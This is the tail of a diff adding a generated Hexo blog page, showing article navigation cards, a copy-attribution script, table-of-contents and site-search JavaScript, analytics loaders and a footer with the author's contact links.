+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%B8%8A%E4%BC%A0/">
+                        <span class="chip bg-color">文件包含&amp;上传</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/08/27/md-yu-fa/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="md语法">
+                        
+                        <span class="card-title">md语法</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            ​
+
+支持平台：微信公众号。​支持注音符号，用法如下：​Markdown Nice 这么好用，简直是{喜大普奔|hē hē hē hē}呀！
+
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Lees
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('100')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Lees&#39;s Blog<br />'
+            + '文章作者: Lees<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021-2022</span>
+            
+            <a href="/about" target="_blank">Lees</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">19.7k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2021";
+                        var startMonth = "9";
+                        var startDate = "5";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:lees01@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2578546966" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2578546966" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
